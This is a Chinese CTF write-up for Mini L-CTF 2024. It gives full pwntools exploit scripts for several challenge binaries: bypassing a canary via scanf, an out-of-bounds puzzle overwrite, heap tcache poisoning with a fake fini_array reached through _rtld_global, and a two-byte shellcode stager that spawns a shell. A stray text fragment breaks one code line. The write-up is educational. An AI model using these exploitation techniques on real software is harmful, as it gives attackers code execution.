# Mini L-CTF 2024 Writeup - RiK

​	算是第一次参加常规的 CTF，由于团队分工，我主打 Pwn 方向。

## Pwn - Ottoshop♿

​	最抽象的一集。在 `main` 函数里看到，输入 `666` 可以获得一次购买 golden ♿ 的机会。注意到设置 ♿ 名字的 `scanf` 存在溢出。 `scanf` 读取数字时，**输入 `+` 或 `-` 即可跳过一次输入**（因为不知道这回事卡了好久 😭），这样可以绕过 canary 保护，修改返回地址劫持控制流。`buy` 函数和 `change` 函数中都**未检查负数 index**，可以向上任意写。在一堆 otto 函数（雾）中发现**后门函数 `o77oOtTo0T70()`**（由于直接用 syscall 而非封装函数，所以从 got 表看不出端倪），其检查 `flag2` 值是否为 `otto` 并从 `flag1` 中异或出 `/bin/sh\0` 并执行 `execve`。所以只需要用 `buy` 修改 `flag2`（index = -72）、`money`（index = -90），用 `golden` 劫持控制流至后门函数即可。

Exp：

```python
from pwn import *

context.terminal = ['konsole', '-e']

binary = 'ottoshop'
p = process(binary)
elf = ELF(binary)

address = 0x04020A4
need_to_be_666 = 0x407580
start = 0x407180
flag2 = 0x407060
money = 0x407018

pos1 = (flag2 - start) // 4
pos2 = (money - start) // 4

p.sendline(b'666')
p.sendline(b'')

p.sendline(b'1')
p.sendline(b'-72')
p.send(b'otto')

p.sendline(b'1')
p.sendline(b'-90')
p.send(b'abcd')

p.sendline(b'3')
p.sendline(b'4')
p.sendline(b'0')
p.sendline(b'+')
p.sendline(b'0')
p.sendline(b'4202660')
p.interactive()
```

## Pwn - game

​	最折磨的一集。游戏是数字华容道。发现**上下移动不会检查边界**，可以修改返回地址。程序中存在**后门函数 `backdoor()`**。一开始的思路是利用栈中残余固定的值拼凑出一个 `backdoor` 的地址。但是调试起来十分麻烦，所以用 Python 重写了游戏，可视化手动玩，自动生成脚本，大幅减轻负担。

```python
import numpy

input_str = '''
0x7ffc0836c080: 0x00007ffc0836c090      0x0000598b0000000a
0x7ffc0836c090: 0x010a08090204050b      0x000d070f0e060c03
0x7ffc0836c0a0: 0x00007ffc0836c1f8      0x15445e0a74b74c00
0x7ffc0836c0b0: 0x00007ffc0836c0e0      0x0000598b817dcf48
0x7ffc0836c0c0: 0xdcdcd8d8dcd8dcd8      0x0000769a5ce75400
'''
print()

def flat(eles):
    res = []
    for i in eles:
        if isinstance(i, list):
            res.extend(flat(i))
        else:
            res.append(i)
    return res

data = flat([([i.split(':')[1].strip().split('      ')[0].replace('0x', '')] + [i.split(':')[1].strip().split('      ')[1].replace('0x', '')]) for i in input_str.strip().split('\n')])

tiles = []

for addr in data:
    temp = []
    while len(addr) != 0:
        temp.append(addr[0:2])
        addr = addr[2:]
    tiles.extend(temp[::-1])

tiles_np = numpy.array(tiles).reshape(len(tiles) // 4, 4)
tiles = tiles_np.tolist()

# 一些提示符
tiles[7][2] = 'YY'
tiles[7][3] = 'XX'
tiles[10][3] = '||'
tiles[11][3] = '||'
tiles[14][0] = '-0'
tiles[14][1] = '-1'
tiles[14][2] = 'EE'
tiles[14][3] = 'FF'
tiles[15][0] = 'AA'
tiles[15][1] = 'BB'
tiles[15][2] = 'CC'
tiles[15][3] = 'DD'

moves = []

class Point:
    x: int
    y: int

p = Point()
p.x = 3
p.y = 7

def up():
    moves.append('up')
    tiles[p.y][p.x], tiles[p.y - 1][p.x] = tiles[p.y - 1][p.x], tiles[p.y][p.x]
    p.y -= 1

def down():
    moves.append('down')
    tiles[p.y][p.x], tiles[p.y + 1][p.x] = tiles[p.y + 1][p.x], tiles[p.y][p.x]
    p.y += 1

def left():
    moves.append('left')
    tiles[p.y][p.x], tiles[p.y][p.x - 1] = tiles[p.y][p.x - 1], tiles[p.y][p.x]
    p.x -= 1

def right():
    moves.append('right')
    tiles[p.y][p.x], tiles[p.y][p.x + 1] = tiles[p.y][p.x + 1], tiles[p.y][p.x]
    p.x += 1
   
moves = []

while True:
    print(numpy.array(tiles))
    move = input('> ')
    match move:
        case 'w':
            up()
        case 'a':
            left()
        case 's':
            down()
        case 'd':
            right()
        case 'e':
            break
        case _:
            print('Invalid')
            
for move in moves:
    print(move + '(1)')
```

​	好不容易拼凑出地址（由于开了 PIE 保护，所以需要爆破 1/16 概率），发现由于栈对齐，`system` 函数调用出现 `SIGSEGV`（😇）。在栈上合理范围内实在找不到可以拼凑出 `backdoor + 1` 等地址的值。然后，然后，然后突然发现程序开头我一直无视的 `name`，其实可以**输入一个地址**（还是经验少了 😫）。

Exp：

```python
from pwn import *
import time

context.terminal = ['konsole', '-e']

binary = 'game'
p = process(binary)
elf = ELF(binary)

backdoor = 0xCD8
ret_ori = 0xF48

SLEEP = 0.001

def up(times: int):
    for _ in range(times):
        p.send(b'w')
        time.sleep(SLEEP)

def down(times: int):
    for _ in range(times):
        p.send(b's')
        time.sleep(SLEEP)

def left(times: int):
    for _ in range(times):
        p.send(b'a')
        time.sleep(SLEEP)

def right(times: int):
    for _ in range(times):
        p.send(b'd')
        time.sleep(SLEEP)

while True:
    binary = 'game'
    p = process(binary)
    p.sendline(p64(0xDCDCD8D8DCD8DCD8))
    p.sendline(b'')
    p.sendline(b'')

    left(3)
    up(5)
    right(1)
    down(5)
    right(2)

    # 自动生成
    down(1)
    down(1)
    down(1)
    down(1)
    down(1)
    down(1)
    down(1)
    down(1)
    left(1)
    left(1)
    left(1)
    down(1)
    down(1)
    right(1)
    right(1)
    up(1)
    up(1)
    left(1)
    down(1)
    right(1)
    up(1)
    up(1)
    left(1)
    left(1)
    down(1)
    down(1)
    right(1)
    right(1)
    up(1)
    up(1)
    left(1)
    down(1)
    down(1)
    left(1)
    up(1)
    right(1)
    down(1)
    down(1)
    right(1)
    right(1)
    up(1)
    left(1)
    up(1)
    up(1)
    right(1)
    down(1)
    down(1)
    left(1)
    up(1)
    up(1)
    right(1)
    down(1)
    left(1)
    up(1)
    right(1)
    up(1)
    up(1)
    up(1)
    up(1)
    up(1)
    up(1)
    up(1)

    for i in range(93):
        left(1)
        right(1)
    
    try:
        p.sendline(b'')
        p.sendline(b'')
        p.sendline(b'')
        p.interactive()
    except EOFError:
        continue
```

## Reverse - Long long call

​	（Pwn 暂时做不出来，跑去隔壁逆向看看 🤓。）IDA 打开后发现反编译完全没意义了。程序中每个汇编语句都用一个调用、一个抵消调用栈的 `add rsp, 0x8`，一对无意义 `pushf popf` 混淆，用 gdb 调试发现存在反调试，通过查找文本 `Hacker` 定位到反调试触发点，用 Keypatch 将其填 `nop`（`0x14AF` 至 `0x14B3`）拿下反调试，然后就可以愉快调试了。逆向发现 **`0x4080` 处存储了混淆后的 flag**，程序逻辑是**对输入字符串每两字符对其和分别原地求异或**，并与同样加密后的 flag 比较。取出加密后 flag，编写 Python 脚本爆破得原始 flag。

```python
def crack(A, B):
    for a in range(0,255):
        for b in range(0,255):
            if ((a^(a+b)) == A) and (b^(a+b) == B):
                print(f"{chr(a)}{chr(b)}", end="")

data = [[0xBB, 0xBF], [0xB9, 0xBE], [0xC3, 0xCC], [0xCE, 0xDC], [0x9E, 0x8F], [0x9D, 0x9B], [0xA7, 0x8C], [0xD7, 0x95], [0xB0, 0xAD], [0xBD, 0xB4], [0x88, 0xAF], [0x92, 0xD0], [0xCF, 0xA1], [0xA3, 0x92], [0xB7, 0xB4], [0xC9, 0x9E], [0x94, 0xA7], [0xAE, 0xF0], [0xA1, 0x99], [0xC0, 0xE3], [0xB4, 0xB4], [0xBF, 0xE3]]

for d in data:
    crack(d[0], d[1])
```

## Pwn - PhoneBook

​	收获最多的一集，综合复习/学习了各种堆利用方法。

​	（后有附图）

#### 0x00 Leak Heap Ptr

​	分析程序，保护开满，增删改查堆题。发现 **`phone` 字段存在三字节溢出**，可以修改其后的 `next` 字段以达成任意分配堆地址，得到**任意读任意写**机会。通过构造两个假 chunk（offset：0x10、0x20，id：50、51），以其作为桥梁泄漏堆地址。定义 `person` 结构体助记：

```c
00000000 person          struc ; (sizeof=0x28, mappedto_8)
00000000 id              dq ?
00000008 name            db 16 dup(?)            ; string(C)
00000018 phone           db 8 dup(?)             ; string(C)
00000020 next            dq ?                    ; offset
00000028 person          ends
```

Exp 0：

```python
add(b'\n', b'\n')
add(b'456\n', b'\n')
edit(1, b'\n', b'A'*9) # 连通后方 next_ptr
show()
rec = p.recv()
pos = rec.index(b'A'*9)
chunk2_addr = u64(b'\0' + rec[pos+9: pos+14] + b'\0\0')
chunk1_addr = chunk2_addr - 0x30
chunk3_addr = chunk2_addr + 0x30
fake_chunk0_addr = chunk2_addr + 0x10
fake_chunk1_addr = chunk2_addr + 0x20
print('fake chunk0: ' + hex(fake_chunk0_addr))
print('fake chunk1: ' + hex(fake_chunk1_addr))
print('chunk2: ' + hex(chunk2_addr))
```

#### 0x01 Unsorted Bin Leak Libc

​	再次以 `chunk1` 为引导，`fake_chunk0` 和 `chunk2` 为桥梁在 `fake_chunk0` 处构造假 unsorted bin 大小（0x840）的 chunk，并加上 `PREV_INUSE` 标志（0x1），其 `size` 位于原 `person` 结构体的 `phone` 处，连续填充多个 `phone` 字段为 `0x31` 的 chunk（偷懒不想算精确位置），以绕过 unsorted bin prev chunk size 检查。最后 `delete` `fake_chunk0`，**进入 unsorted bin，`show` 获取 main_arena 地址及 libc 基址**。需要注意绕过 `id` 大小检查（与 `next` 冲突）和 `add` 填零（所以这块很绕😀）。

Exp 1：

```python
edit(1, b'\n', cyclic(8) + p64(chunk2_addr)[0:2]) # 暂时恢复
for i in range(50): # 冗余
    add(b'\n', p64(0x31))
    p.recv()
edit(3, cyclic(8) + p64(chunk3_addr), b'\n')
edit(2, p64(49) + p64(50)[0:7], p64(0x841) + p64(fake_chunk0_addr)[0:2])
edit(50, p64(0x841) + p64(51)[0:7], cyclic(8) + p64(fake_chunk1_addr)[0:2])
edit(1, b'\n', cyclic(8) + p64(fake_chunk1_addr)[0:2])
delete(51) # VULN
edit(1, b'\n', cyclic(8) + p64(fake_chunk1_addr)[0:2])
p.recv()
show()
rec = p.recv()
pos = rec.rfind(cyclic(8))
main_arena_addr = u64(rec[pos+30:pos+36] + b'\0\0')
print('main_arena: ' + hex(main_arena_addr))
main_arena_offset = 0x219CE0
free_hook_offset = 0x2204A8
libc_base_addr = main_arena_addr - main_arena_offset
print('libc: ' + hex(libc_base_addr))
```

#### 0x02 Leak `_rtld_global._ns_loaded` (`link_map`)

​	到这里正常解法是利用上述任意写直接覆盖 `malloc_hook` 等，写入 one _gadget，卡了好久突然意识到 glibc 2.34 已移除各种 hook（😩），只好另辟蹊径。打 IO 没学过/太麻烦，现学了一个较简单的高版本打法（好像叫 House of Banana？）。

​	glibc 中链接了 ld.so 中的一个符号 `_rtld_global`，其保存不少用于动态链接的运行时信息。我们主要关注 `_ns_loaded` 字段（offset：0x00），这是一个结构体指针（链表），其指向的字段 **`l_addr`（offset：0x00）保存了程序基址**，通过分析 glibc `exit(int)` 函数源码发现，其执行中途会读取该字段并根据它寻找并**执行 `fini_array` 中存储的函数**（指针）。我们劫持 `_ns_loaded`，将其改为 `堆上一可控地址 - fini_array 偏移量`，再向该可控位置填入 one_gadget 即可。

​	首先泄露地址。用类似 `0x00` 步的方法，泄露出 `_rtld_global` 及 `_ns_loaded` 地址。（虽然网上许多文章都认为这两个地址以及 ld.so 即使开了 ASLR 也与 libc 有固定偏移，或本地与远程不同只需爆破两字节，但我经实验发现本地甚至每次执行都不同🤔。）

Exp 2：

```python
rt_ld_global = libc_base_addr + 0x21A878
edit(1, b'\n', cyclic(8) + p64(fake_chunk0_addr)[0:2])
edit(50, cyclic(8) + p64(51)[0:7], cyclic(8) + p64(fake_chunk1_addr)[0:2])
edit(1, b'\n', cyclic(8) + p64(fake_chunk1_addr)[0:2])
edit(51, cyclic(8) + p64(rt_ld_global - 0x8)[0:7], b'\n')
edit(1, b'\n', cyclic(8) + p64(fake_chunk0_addr)[0:2])
show()
rec = p.recv()
pos = rec.find(b'@')主要是标题
_rtld_global_addr = u64(rec[pos:pos+6] + b'\0\0')
print('_rtld_global addr: ' + hex(_rtld_global_addr))
link_map_addr = _rtld_global_addr + 0x12A0
```

#### 0x03 Tcache Bin Poisoning Arbitrary Write

​	如法炮制，**劫持 `fake_chunk1` tcache bin `next` 字段**，两次 `delete` 两次 `add` 分配新 chunk 至 `_ns_loaded` 指针并修改为可控堆地址。

Exp 3：

```python
chunk5_addr = chunk3_addr + 0x60
chunk6_addr = chunk5_addr + 0x30
fini_array_offset = 0x3D78
target = link_map_addr
fake_rt_ld_addr = chunk6_addr
print('target: ' + hex(target - 0x10))
edit(1, b'\n', cyclic(8) + p64(fake_chunk0_addr)[0:2])
edit(50, p64(0x841) + p64(51)[0:7], b'\n')
edit(1, b'\n', cyclic(8) + p64(fake_chunk1_addr)[0:2])
edit(51, p64(0x31) + p64(3)[0:7],cyclic(8) + p64(chunk3_addr)[0:2])
delete(4)
delete(3)
edit(51, p64(0x31) +
        p64(
            (target - 0x10) ^ (fake_chunk1_addr >> 12) # unsafe unlink
        )[0:7],                                        # name (0x10)
    cyclic(8) + p64(chunk5_addr)[0:2])
add(b'PWN!', b'PWN!')
add(cyclic(8) + p64(fake_rt_ld_addr + 0x8 - fini_array_offset)[0:7], p64(4)) # name (0x8)
edit(1, b'123', cyclic(8) + p64(fake_chunk0_addr)[0:2])
edit(50, p64(0x841) + p64(main_arena_addr)[0:7], p64(main_arena_addr))
edit(1, b'123', cyclic(8) + p64(chunk6_addr)[0:2])
```

#### 0x04 Fake `fini_array`

​	终于结束了。在对应位置写入 one_gadget，exit getshell。（🥳🎉）

Exp 4：

```python
one_gadget = 0xebcf1
edit(6, p64(libc_base_addr + one_gadget), cyclic(8))
exitit()

p.interactive()
```

#### 0xff Appendix

一张图：

```
                     +main--+                    
                     | ...  |                    
                     | size |                    
                     |  id1 |                    
                     |  na  |                    
                     |  me  |                    
                     | phone|                    
                     | next |                    
                     | size |                    
                     |  id2 | +fake0-+           
                     |  na  |-| size |           
            +fake1-+ |  me  |-| id50 |           
            | size |-| phone|-|  na  |           
unsort pos->| id51 |-| next |-|  me  |           
            |  na  |-| size |-| phone|           
            |  me  |-|  id3 |<| next |-tcache pos
            | phone|-|  na  | +------+           
            | next |-|  me  |                    
            +------+ | phone|                    
                     | next |                    
                     | size |                    
                     | ...  |                    
                     +------+                    
```

一些操作的封装：

```python
def s():
    time.sleep(0.01)

def add(name: bytes, phone: bytes):
    p.sendline(b'1')
    s()
    p.send(name)
    s()
    p.send(phone)
    s()

def delete(index: int):
    p.sendline(b'2')
    s()
    p.sendline(str(index).encode())
    s()

def show():
    p.sendline(b'3')
    s()

def edit(index: int, name: bytes, phone: bytes):
    p.sendline(b'4')
    s()
    p.sendline(str(index).encode())
    s()
    p.send(name)
    s()
    p.send(phone)
    s()

def exitit():
    p.sendline(b'5')
    s()
```

（用 `sendafter` 更好，但是我总是遇到奇奇怪怪问题，懒得调了。）

​	（后来听说这题竟然可 ROP 😨，我直到现在还没找到 😰。）

## Pwn - 2 bytes

​	最喜欢的一集。分析程序发现**用溢出绕过`strcmp(...)`检查**后只有 2 字节（点题）shellcode 可用，另有 5 字节空间。枚举机器码发现 `syscall` 正好两字节（`\x0f\x05`），而且当前寄存器布局因为先前的`mmap(...)`调用和 `mov eax, 0` ，很适合`read`系统调用，但是差一点，需要交换 `rdx` 与 `rsi` 位置。折腾很久后发现可以先 **`jmp 0xfffffffffffffffb`（`\xeb\xf9`）至 `passwd` 开头处（-5）**，从而执行更多指令：`xchg rdx, rsi`（`\x48\x87\xf2`）+ `syscall`。（加上 `jmp` 竟然正好 7 字节😧）最后写入真正的 shellcode 即可。另外编写 Python 脚本绕过异或混淆。

Exp：

```python
from pwn import *

context.terminal = ['konsole', '-e']
context(os='linux', bits=64, arch='amd64')

binary = './pwn'
p = process(binary)
elf = ELF(binary)

b'\x48\x87\xf2\x0f\x05\xeb\xf9'
def crack(sh: bytes):
    res: bytes = sh[:2]
    for i in range(5):
        for c in range(256):
            if sh[i + 2] == sh[i] ^ sh[i + 1] ^ c:
                res += c.to_bytes()
                break
    return res

def mangle(sh: bytes):
    for i in range(0, 5):
        sh = sh[:i + 2] + (sh[i] ^ sh[i + 1] ^ sh[i + 2]).to_bytes() + sh[i + 3:]
    return sh

def tryit(code: str):
    b = asm(code)
    b = b[0:2] + b'\0' + b[3:]
    print(disasm(b))

payload = b'H\x87=z\xf8\xe1\x17'
payload = payload + b'\0' + payload

p.send(payload)
p.send(asm(shellcraft.sh()))
p.interactive()
```
